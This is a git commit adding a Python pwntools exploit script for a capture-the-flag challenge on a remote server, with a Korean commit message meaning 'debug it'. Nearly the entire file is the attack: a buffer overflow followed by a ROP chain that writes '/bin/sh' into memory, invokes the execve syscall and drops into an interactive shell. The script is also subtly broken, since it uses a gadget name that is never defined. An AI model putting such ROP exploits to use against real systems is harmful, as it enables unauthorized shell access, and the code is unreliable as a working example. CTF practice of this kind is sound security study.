2147fd2b179b3575dd4b2ee4589b897e84113373
fr0g2s <turttle2s@naver.com>
2020-07-10 18:23:55 +0900

    디버깅하셈

---
+++ lookatme_d/lookatme.py
@@ -0,0 +1,32 @@
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz',3017)
+
+popeaxret = 0x806d646	# eax=0xb
+popecxebxret = 0x806f051 # ecx = "/bin/sh"
+syscall = 0x0806d60c
+bss = 0x080eaf80
+read = 0x806d5f0
+popebxesiediret = 0x80bacfe
+
+payload = ''
+payload += 'a'*0x18 + 'b'*0x4
+payload += p32(read)
+payload += p32(popebxesiedi)
+payload += p32(0x0)
+payload += p32(bss)
+payload += p32(0x8)
+payload += p32(popecxebxret)
+payload += p32(0x0)
+payload += p32(bss)
+payload += p32(popeaxret)
+payload += p32(0xb)
+payload += p32(syscall)
+
+p.sendline(payload)
+sleep(0.5)
+p.send('/bin/sh\x00')
+sleep(0.5)
+
+p.interactive()
+
